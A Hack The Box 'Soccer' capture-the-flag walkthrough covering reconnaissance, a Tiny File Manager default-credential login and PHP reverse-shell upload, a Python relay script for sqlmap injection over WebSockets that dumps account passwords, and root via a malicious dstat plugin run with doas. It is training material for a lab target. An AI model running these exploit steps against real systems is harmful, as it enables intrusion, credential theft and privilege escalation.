---
layout: default
title : muzec - Soccer HTB Writeup
---


![image](https://user-images.githubusercontent.com/69868171/218117279-f27eebec-fbed-4900-a1e9-7cdd0c83c12c.png)


#### RECON

Enumeration is the key to everthing so we always kick off with an nmap scan on the target IP.

```
└─$ nmap -p- --min-rate 2000 -sC -sV -oN nmap/soccer.tcp 10.10.11.194
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-10 15:38 WAT
Warning: 10.10.11.194 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.194
Host is up (0.27s latency).
Not shown: 38489 filtered tcp ports (no-response), 27044 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 286.53 seconds
```

Now it connfirm we have SSH 22 and HTTP 80 port presently open the target which is interesting since it rated easy i think we already know we don't need to dig that much we can start a quick enumeration on the HTTP port already.

```
└─$ curl -i http://10.10.11.194
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 10 Feb 2023 14:48:02 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: http://soccer.htb/

<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
```

Some old habit i always use to print out the response headers in the output using `curl` command now that we have the domain let add to our hosts file.

```
sudo vim /etc/hosts

.......
10.10.11.194        soccer.htb
.......
```

Now that we have that set let access the web-server surely we are using the browser XD.

![image](https://user-images.githubusercontent.com/69868171/218122187-0bc713c6-ee50-4e23-bcf2-0cc4a0a3294a.png)


Interesting a web page that talk on how soccer is the best sports in the world which is true no cap but i still take hacking like sports XD which mean sports is second to me.

#### Subdomain Fuzz

```
┌──(muzec㉿muzec-sec)-[~/Documents/CTF Hacking/HTB/soccer]
└─$ wfuzz -u http://soccer.htb/ -H "Host: FUZZ.soccer.htb" -w /opt/wordlists/subdomains.txt --hh 178
```

![image](https://user-images.githubusercontent.com/69868171/218126218-472ce0bd-c87a-472d-b8e2-15bfd2b8e7b7.png)


Which i end up getting none so let go ahead amd fuzz for some directories.



#### Directories Fuzz
```
┌──(muzec㉿muzec-sec)-[~/Documents/CTF Hacking/HTB/soccer]
└─$ feroxbuster -u http://soccer.htb/ -w /opt/wordlists/2.3-medium.txt --quiet -t 80
```

![image](https://user-images.githubusercontent.com/69868171/218125962-afbc5da8-f77a-4648-882a-bfecb702a677.png)

Now that is a hit let see what we really have on the tiny web directory.

![image](https://user-images.githubusercontent.com/69868171/218126759-f4bee2e0-bcea-4240-874a-458003ae062d.png)


Tiny File Manager and we seems to need a credentials to get access let try doing some research on a default credentials.

![image](https://user-images.githubusercontent.com/69868171/218127164-91c79c4e-0ca3-48a5-8c79-554495d607d4.png)

Default username/password: 

```
admin/admin@123
user/12345
```

![image](https://user-images.githubusercontent.com/69868171/218127761-74141392-38ee-4ae4-9171-387a6d53e297.png)


We got access to the Tiny File Manager and seems to find the version it running a quick research again.

![image](https://user-images.githubusercontent.com/69868171/218128210-f73afd5b-84a5-47a6-92ae-248d922afa64.png)


Which come to our notice that tiny file manager is vulnerable to an authenticated remote code execution allowing a malicious user to upload a php file to be able to execute a system command on the webserver now that we know what we are dealing with let get our malicious php file ready and upload on the webserver to get a reverse shell.

![image](https://user-images.githubusercontent.com/69868171/218128951-d015947c-16f6-49ab-99a3-f83c0033efa3.png)


Created a PHP file added our tun0 IP, Port to receive a reverse shell back to us.

![image](https://user-images.githubusercontent.com/69868171/218130364-444fbf10-8b2f-416b-9bf6-a3ef05678ba4.png)


```
nc -nvlp 80
```


![image](https://user-images.githubusercontent.com/69868171/218130939-3af7db85-7fba-460f-ba25-017298cf7a32.png)


Navigating to http://soccer.htb/tiny/uploads/muzec.php to trigger our php file and we got a reverse shell back to our listener.

![image](https://user-images.githubusercontent.com/69868171/218131686-0a031b5b-c304-4be4-afb0-0c9f260112b7.png)

We spawn a full tty shell to make our shell more stable and we go ahead and start enumerating once again to find a way to move our privilege to a higher user by checking all files sysetem on the target.


#### WWW-DATA 

![image](https://user-images.githubusercontent.com/69868171/218132637-2ab8f6b6-a928-492e-9613-ab6b1e2311df.png)

Now that seems like a new subdomain no wonders we are unable to get hit when we fuzz for one seems unique. Back to our attacking machine to add the new subdomain we got from the target machine.


```
sudo vim /etc/hosts

.........
10.10.11.194          soccer.htb    soc-player.soccer.htb
.........

```

![image](https://user-images.githubusercontent.com/69868171/218133536-9f0ae061-3453-4274-8ae3-a2d7b18ea3ba.png)

Now that look promising right i bet you think the same we have a page to login/sign up since we have no active credentials let sign up.

![image](https://user-images.githubusercontent.com/69868171/218134349-1a4acfb9-cd49-4128-8d28-c794349f38e3.png)

Now that our account is ready let hit the login page to sign in.

![image](https://user-images.githubusercontent.com/69868171/218134529-f16cff8f-e396-4419-99d8-af57ecc48068.png)


Now we are done to a check page which check a valid ticket ID.


![image](https://user-images.githubusercontent.com/69868171/218134728-d16d03f7-59ef-43a5-8b7f-1cc279b186ba.png)


Interesting i decided to try a wrong ticket ID to see what happened.

![image](https://user-images.githubusercontent.com/69868171/218134933-16dec5b5-08b2-4d24-a671-5c44437254c4.png)

Which seems to be wrong when i try a false ID. Checking the page source and we notice it seems to be using a websocket URL to make a request to the internal port 9091 just from my guessing we should know we are actually dealing with an SQL injection vulns.

A QUICK NOTE:- The **wss** protocol establishes a WebSocket over an encrypted TLS connection, while the **ws** protocol uses an unencrypted connection.

![image](https://user-images.githubusercontent.com/69868171/218135435-895ba792-be70-4fa2-bc6d-aba8c0de67ef.png)


#### Find SQLi in Websockets

Interacting with WS with Burp suite which is really nice here. Let inetercept the tickets form checker with burp suite and right click and send it to Repeater:

![image](https://user-images.githubusercontent.com/69868171/218138442-35825139-c51b-4563-b752-d3eb2c38a19b.png)

We can notice from the history when a ticket is valid we got `Ticket Exists` but when a ticket is not valid we know the response is `Ticket Doesn't Exist` now that we know it clear let go ahead and test fro sql injection.

![image](https://user-images.githubusercontent.com/69868171/218138872-e8ddd04f-4f54-4796-8716-7f328635f971.png)


#### Testing For SQL Injection

A standard SQLi check is to send a `'` character, but that does nothing interesting here we just got a response with no valid tickets:

![image](https://user-images.githubusercontent.com/69868171/218139885-6a16e799-c3e9-44a3-9fce-1581326fdbef.png)

So what i did is i try and send a ticket ID that does not exist and with an SQL query `1=1` to see if it really give out a valid ticket response or an invalid ticket response.  

![image](https://user-images.githubusercontent.com/69868171/218141547-5fdab925-67ba-414a-87a1-8e3cfedcd006.png)

Boom we got a valid ticket response even when we know that the ID really doesn’t exist. This is confirmed SQL injection.

#### SQLi Helpers with SQLMAP and a custom python script

It is similar to SQLMap tamper scripts but in this case the script will act as a standalone server vulnerable to SQLi on GET parameter.

```py
#!/usr/bin/env python3

from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://soc-player.soccer.htb:9091/"

def send_ws(payload):
    ws = create_connection(ws_server)
    # If the server returns a response on connect, use below line    
    #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
    
    # For our case, format the payload in JSON
    message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
    data = '{"id":"%s"}' % message

    ws.send(data)
    resp = ws.recv()
    ws.close()

    if resp:
        return resp
    else:
        return ''

def middleware_server(host_port,content_type="text/plain"):

    class CustomHandler(SimpleHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            try:
                payload = urlparse(self.path).query.split('=',1)[1]
            except IndexError:
                payload = False
                
            if payload:
                content = send_ws(payload)
            else:
                content = 'No parameters specified!'

            self.send_header("Content-type", content_type)
            self.end_headers()
            self.wfile.write(content.encode())
            return

    class _TCPServer(TCPServer):
        allow_reuse_address = True

    httpd = _TCPServer(host_port, CustomHandler)
    httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
    middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
    pass
```

The python script will get a request with a single parameter, and use that to make the websocket connection with that parameter as the injection. This allows `sqlmap` to see a standard HTTP server, but then it does the websockets injection.

```
└─$ python3 sqli.py 
[+] Starting MiddleWare Server
[+] Send payloads in http://localhost:8081/?id=*
```
Now that we have it running let hit with sqlmap.

```
sqlmap -u "http://localhost:8081/?id=1" --batch --dbs
```

![image](https://user-images.githubusercontent.com/69868171/218151389-9fc7213d-abb8-4b63-a4cd-63127bcf42fa.png)

It works `soccer_db` seems interesting let list the tables with sqlmap and possible aso dump all columns.

```
sqlmap -u "http://localhost:8081/?id=1" --batch -D soccer_db --tables
```

When we go the tables we can go ahead and dump the interesting columns.

```
sqlmap -u "http://localhost:8081/?id=1" --batch -D soccer_db -T accounts -C id,email,password,username  --dump
```

![image](https://user-images.githubusercontent.com/69868171/218163012-10d72288-9e01-4eb6-abc3-708338c4b2ba.png)


We got the user `player`password in plaintext let try on SSH.

Username: player
Password:- PlayerOftheMatch2022

![image](https://user-images.githubusercontent.com/69868171/218163736-1836bc02-fa26-4a72-890e-da235dd938f5.png)


We have access and we should have the user.txt in the home folder of user player.


![image](https://user-images.githubusercontent.com/69868171/218163928-0b3a3fbb-918c-43ea-b1c6-950507c8993f.png)


#### Privilege Escalation.

Nothing on sudo we decided to check for SUID permission.

```
find / -perm -u=s -type f 2>/dev/null
```

![image](https://user-images.githubusercontent.com/69868171/218164706-d105101b-7e01-40e6-b7f8-0a66f749863f.png)


Doas seems interesting let check the conf file.

![image](https://user-images.githubusercontent.com/69868171/218165140-5d338d3b-a4ad-4dc4-8311-1ac175e64e67.png)

We can run dstat with doas with nopass as user root.

![image](https://user-images.githubusercontent.com/69868171/218165984-6798ccc6-c02a-4fbc-b574-f637745d9b06.png)

Dstat is a versatile tool for generating system resource statistics.  It allows users to create a custom plugin and execute by adding option e.g. dstat --myplugin.

#### Exploitation

First off, let find and locate the "dstat" directory.

```
find / -type d -name dstat 2>/dev/null
```

![image](https://user-images.githubusercontent.com/69868171/218166531-288221df-8ce4-473f-a974-6114cf2f2732.png)

Now let create a plugin called `dstat_exploit.py` under "/usr/local/share/dstat/".

```py
import os

os.system('chmod +s /usr/bin/bash')
```

![image](https://user-images.githubusercontent.com/69868171/218166996-906c3564-7ad0-480f-adb1-554b3c2f037c.png)

Dstat recognizes plugins under "/usr/local/share/dstat/".  Check if the above exploit plugin has been added by executing the following command.

```cli
dstat --list | grep exploit
```

#### Doas To Execute Dstat with the Malicious Plugin

Now execute "dstat" with `—exploit` flag (the flag name is determined by the suffix of the file name e.g. "dstat_<plugin-name>.py").

```cli
doas -u root /usr/bin/dstat --exploit
```

![image](https://user-images.githubusercontent.com/69868171/218170260-de8405fe-7b1e-47a3-abd2-5b3e28250b20.png)

Now when we run `bash -p` we should be root.
    
![image](https://user-images.githubusercontent.com/69868171/218170401-c9a43b4f-e1de-437b-8179-fd1552624c97.png)

    
Now getting the root.txt file.

![image](https://user-images.githubusercontent.com/69868171/218170540-53343d66-ae54-4fc0-be58-2f42af926331.png)

rooooooooooooooot and done.
    
Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
